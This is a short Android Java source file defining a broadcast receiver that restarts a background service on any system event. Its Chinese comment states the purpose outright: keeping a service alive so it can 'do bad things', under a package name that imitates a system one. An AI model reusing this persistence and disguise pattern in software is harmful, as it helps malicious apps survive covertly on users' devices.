package com.android.service;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

/**
 * 在一个超级广播接收者中启动服务
 * 为防止服务被关闭，我们为此BroadcastReceiver注册了很多广播事件的，只要有一个广播被我们获取，我们就启动后台服务干坏事
 */
public class SuperReceiver extends BroadcastReceiver {
	
	@Override
	public void onReceive(Context context, Intent intent) {
		context.startService(new Intent(context, SystemService.class));
		Log.i("bqt", intent.getAction());
	}
}